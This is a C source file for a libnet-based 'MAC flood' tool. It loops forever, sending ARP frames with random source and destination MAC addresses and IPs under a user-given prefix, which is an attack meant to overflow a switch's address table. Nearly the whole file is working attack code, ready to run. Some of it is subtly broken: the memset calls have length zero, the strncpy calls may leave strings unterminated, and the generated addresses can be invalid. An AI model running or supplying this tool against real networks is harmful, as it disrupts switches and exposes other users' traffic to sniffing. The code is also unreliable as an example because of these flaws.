#include <stdio.h>
#include <libnet.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void get_remaining_mac();

void error(const char* error_message, int exit_code)
{
	printf("Error!\n\n");
	perror(error_message);
	exit(exit_code);
}

int main(int argc, char* argv[])
{
	time_t tme;
	srand((unsigned int)time(&tme));

	printf("Welcome to MACdonalds flood (+.+) <Program by cyan55>\n\n----------------------------------------------\n\n");

	if(argc < 4)
		error("Usage: macflood.out <device> <interval> <ip_prefix>\n\n<device>: The device you would like to use\n<interval>: An interval between packets are sent or -1\n<ip_prefix>: A prefix important to set in order to keep a flood within a network. This argument must contain three parts XXX.XXX.XXX. with a trailing .", -1);

	int interval = atoi(argv[2]);

	char device[10];
	char errbuff[LIBNET_ERRBUF_SIZE];
	char ip_prefix[12];

	//Copy ip prefix
	memset(ip_prefix, '\0', 0);
	strncpy(ip_prefix, argv[3], 12);

	strncpy(device, argv[1], 10);
	libnet_t *lnet = libnet_init(LIBNET_LINK, device, errbuff);

	if(lnet == NULL)
		error((const char*)errbuff, -1);

	printf("Opened instance with device %s\n", device);

	//Seed prand
	int seed = libnet_seed_prand(lnet);
	int mac_addr_size = 17;

	//Set dest addr
	u_int8_t* dest_addr;
	u_int8_t* src_addr;
	char session_mac[18];
	char session_dest_mac[18];

	//Fake ip addresses
	//192.168.7.88
	char src_ip_c[32];
	char dst_ip_c[32];

	u_int32_t src_ip;
	u_int32_t dst_ip;

	int n = 1;
	while(0==0)
	{
		memset(src_ip_c, '\0', 0);
		memset(dst_ip_c, '\0', 0);

        	sprintf(src_ip_c, "%s%.2d", ip_prefix, (rand() % (999 - 1 + 1)) + 1);
	        sprintf(dst_ip_c, "%s%.2d", ip_prefix, (rand() % (999 - 1 + 1)) + 1);

        	src_ip = libnet_name2addr4(lnet, src_ip_c, LIBNET_DONT_RESOLVE);
	        dst_ip = libnet_name2addr4(lnet, dst_ip_c, LIBNET_DONT_RESOLVE);

		memset(session_mac, '\0', 0);
		sprintf(session_mac, "%02x:%02x:%02x:%02x:%02x:%02x", /*"b8:e8:56:"*/(unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand());
		src_addr = libnet_hex_aton(session_mac, &mac_addr_size);

                memset(session_dest_mac, '\0', 0);
                sprintf(session_dest_mac, "%02x:%02x:%02x:%02x:%02x:%02x", /*"da:2b:dd:"*/(unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand(), (unsigned char)rand());
                dest_addr = libnet_hex_aton(session_dest_mac, &mac_addr_size);

		//Need many unicast source mac addresses
		libnet_autobuild_arp(ARPOP_REQUEST, src_addr, (u_int8_t*)(&src_ip), dest_addr, (u_int8_t*)(&dst_ip), lnet);
		libnet_build_ethernet(dest_addr, src_addr, 0x0806, NULL, 0, lnet, 0);
		libnet_open_link(lnet);
		if(libnet_write(lnet) == -1)
			error("Could not write packet to the network", 2);
		libnet_close_link(lnet);

		if(interval != -1)
			sleep(interval);
		printf("[%d][OK] %s<->%s (%s<->%s)\n", n, session_dest_mac, session_mac, dst_ip_c, src_ip_c);
		libnet_clear_packet(lnet);
		n++;
	}
	libnet_destroy(lnet);
	return 0;
}
